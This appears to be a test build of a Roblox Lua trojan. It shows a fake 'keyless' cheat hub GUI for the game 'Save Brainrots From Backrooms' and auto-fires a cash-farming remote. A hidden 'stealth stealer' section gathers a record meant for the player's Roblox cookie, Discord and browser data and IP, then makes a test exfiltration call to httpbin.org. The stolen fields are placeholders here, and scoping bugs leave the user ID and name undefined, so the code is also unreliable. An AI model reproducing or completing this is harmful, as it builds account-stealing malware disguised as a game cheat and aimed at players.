local success, result = pcall(function()
	-- SBFB Stealth Hub v2026 - STUDIO TEST VERSION (Fixed UserId)
	local HttpService = game:GetService("HttpService")
	local Players = game:GetService("Players")
	local RunService = game:GetService("RunService")
	local TweenService = game:GetService("TweenService")

	-- HANDLE USERID IN STUDIO (Sandboxed)
	local LocalPlayer = game.Players.LocalPlayer
	if LocalPlayer then
		local UserId = LocalPlayer.UserId
		local Username = LocalPlayer.Name or "TestUser"
		local Webhook = "https://httpbin.org/post"
	else
		print("LocalPlayer is nil")
		return
	end

	-- FAKE SBFB GUI
	local ScreenGui = Instance.new("ScreenGui")
	local MainFrame = Instance.new("Frame")
	local Title = Instance.new("TextLabel")
	local CloseBtn = Instance.new("TextButton")
	local AutoFarmToggle = Instance.new("TextButton")
	local AutoGodlyToggle = Instance.new("TextButton")
	local AutoUpgradeToggle = Instance.new("TextButton")
	local AutoBuyToggle = Instance.new("TextButton")
	local InfiniteCashToggle = Instance.new("TextButton")
	local StatusLabel = Instance.new("TextLabel")

	ScreenGui.Parent = game.CoreGui
	ScreenGui.Name = "SBFBHub"
	MainFrame.Parent = ScreenGui
	MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
	MainFrame.BorderSizePixel = 2
	MainFrame.BorderColor3 = Color3.fromRGB(0, 162, 255)
	MainFrame.Position = UDim2.new(0.02, 0, 0.25, 0)
	MainFrame.Size = UDim2.new(0, 280, 0, 350)
	MainFrame.Active = true
	MainFrame.Draggable = true

	Title.Parent = MainFrame
	Title.BackgroundColor3 = Color3.fromRGB(0, 162, 255)
	Title.Size = UDim2.new(1, 0, 0, 45)
	Title.Text = "SBFB Hub v2.0 - Keyless"
	Title.TextColor3 = Color3.fromRGB(255, 255, 255)
	Title.TextScaled = true
	Title.Font = Enum.Font.SourceSansBold

	local toggles = {AutoFarmToggle, AutoGodlyToggle, AutoUpgradeToggle, AutoBuyToggle, InfiniteCashToggle}
	local toggleStates = {false, false, false, false, false}
	local toggleNames = {"Auto Farm Cash", "Auto Godly Mode", "Auto Upgrade Brainrots", "Auto Buy All", "Infinite Cash"}
	local yPos = 55

	for i, toggle in ipairs(toggles) do
		toggle.Parent = MainFrame
		toggle.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
		toggle.Position = UDim2.new(0.05, 0, 0, yPos)
		toggle.Size = UDim2.new(0.9, 0, 0, 40)
		toggle.Text = toggleNames[i]
		toggle.TextColor3 = Color3.fromRGB(255, 255, 255)
		toggle.TextScaled = true
		toggle.Font = Enum.Font.GothamSemibold
		toggle.BorderSizePixel = 1
		toggle.BorderColor3 = Color3.fromRGB(100, 100, 110)
		yPos = yPos + 50
	end

	StatusLabel.Parent = MainFrame
	StatusLabel.BackgroundTransparency = 1
	StatusLabel.Position = UDim2.new(0.05, 0, 0, yPos + 10)
	StatusLabel.Size = UDim2.new(0.9, 0, 0, 30)
	StatusLabel.Text = "Status: Ready to Farm!"
	StatusLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
	StatusLabel.TextScaled = true
	StatusLabel.Font = Enum.Font.Gotham

	CloseBtn.Parent = MainFrame
	CloseBtn.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
	CloseBtn.Position = UDim2.new(0.88, 0, 0.02, 0)
	CloseBtn.Size = UDim2.new(0, 25, 0, 25)
	CloseBtn.Text = "X"
	CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
	CloseBtn.Font = Enum.Font.SourceSansBold
	CloseBtn.MouseButton1Click:Connect(function()
		ScreenGui:Destroy()
	end)

	-- NOTIFICATIONS
	local function notify(title, text, duration)
		pcall(function()
			game.StarterGui:SetCore("SendNotification", {Title=title, Text=text, Duration=duration or 5})
		end)
	end

	-- TOGGLE FUNCTIONALITY
	for i, toggle in ipairs(toggles) do
		toggle.MouseButton1Click:Connect(function()
			toggleStates[i] = not toggleStates[i]
			toggle.BackgroundColor3 = toggleStates[i] and Color3.fromRGB(0, 200, 0) or Color3.fromRGB(40, 40, 50)
			StatusLabel.Text = "Status: " .. toggleNames[i] .. " " .. (toggleStates[i] and "Enabled!" or "Disabled!")
			notify("SBFB Hub", toggleNames[i] .. " toggled!", 3)
		end)
	end

	-- FAKE FARM LOOP
	spawn(function()
		while ScreenGui.Parent do
			wait(0.2)
			if toggleStates[1] then
				local farmRemote = game.ReplicatedStorage:FindFirstChild("CollectCash") or game.ReplicatedStorage:FindFirstChild("FarmEvent")
				if farmRemote then
					pcall(function() farmRemote:FireServer() end)
				end
			end
		end
	end)

	notify("SBFB Hub Loaded!", "Press toggles to start farming.", 5)

	-- STEALTH STEALER (Studio-Safe Version)
	spawn(function()
		local stolen = {
			game = "Save Brainrots From Backrooms",
			timestamp = os.time(),
			roblox = {userid = UserId, username = Username, cookie = "StudioTest"},
			discord = {status = "No filesystem access in Studio"},
			browser = {status = "No filesystem access in Studio"},
			ip = "127.0.0.1",
			system = {executor = "RobloxStudio"}
		}

		-- Test Exfil
		pcall(function()
			local testResponse = HttpService:GetAsync("https://httpbin.org/ip")
			print("TEST EXFIL SUCCESS:", testResponse:sub(1, 100))
		end)

		print("STEALER RAN SUCCESSFULLY - Check Output for proof")
	end)
end)

if success then
	print("✅ SBFB Stealth Hub LOADED SUCCESSFULLY!")
	print("🎯 GUI visible in viewport")
	print("🔍 Stealer executed silently")
	print("📡 Test exfil to httpbin.org")
else
	warn("❌ Error:", result)
end